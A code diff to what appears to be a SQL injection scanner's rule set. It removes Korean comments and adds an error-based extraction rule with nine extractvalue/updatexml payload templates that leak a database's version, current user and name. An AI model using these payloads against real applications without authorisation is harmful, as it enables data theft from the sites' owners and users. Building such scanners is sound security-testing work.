@@ -40,8 +40,6 @@ SQLI_RULES: list[dict] = [
         },
     },
     {
-        # UNION — 컬럼 수 불일치 시 "column count doesn't match" 에러를 유발,
-        # judge_union_sqli 가 그 에러 시그니처로 판정하므로 error 계열.
         "attack_id": "PL-SQLI-UNION",
         "vuln_type": "sqli",
         "technique": "union",
@@ -73,6 +71,29 @@ SQLI_RULES: list[dict] = [
                 "{value} ORDER BY 9999-- ",
                 "{value}' ORDER BY 9999-- ",
                 '{value}" ORDER BY 9999-- ',
+            ],
+        },
+    },
+
+    {
+        "attack_id": "PL-SQLI-ERROR-EXTRACT",
+        "vuln_type": "sqli",
+        "technique": "error_extract",
+        "category": "error",
+        "judgment": "extraction",
+        "extract_marker": "~~", 
+        "sequence": ["baseline", "attack"],
+        "payload_templates": {
+            "attack": [
+                "{value} AND extractvalue(1, concat(0x7e7e, substring(version(),1,24), 0x7e7e)) -- ",
+                "{value}' AND extractvalue(1, concat(0x7e7e, substring(version(),1,24), 0x7e7e)) -- ",
+                '{value}" AND extractvalue(1, concat(0x7e7e, substring(version(),1,24), 0x7e7e)) -- ',
+                "{value} AND updatexml(1, concat(0x7e7e, substring(current_user(),1,24), 0x7e7e), 1) -- ",
+                "{value}' AND updatexml(1, concat(0x7e7e, substring(current_user(),1,24), 0x7e7e), 1) -- ",
+                '{value}" AND updatexml(1, concat(0x7e7e, substring(current_user(),1,24), 0x7e7e), 1) -- ',
+                "{value} AND extractvalue(1, concat(0x7e7e, substring(database(),1,24), 0x7e7e)) -- ",
+                "{value}' AND extractvalue(1, concat(0x7e7e, substring(database(),1,24), 0x7e7e)) -- ",
+                '{value}" AND extractvalue(1, concat(0x7e7e, substring(database(),1,24), 0x7e7e)) -- ',
             ],
         },
     },
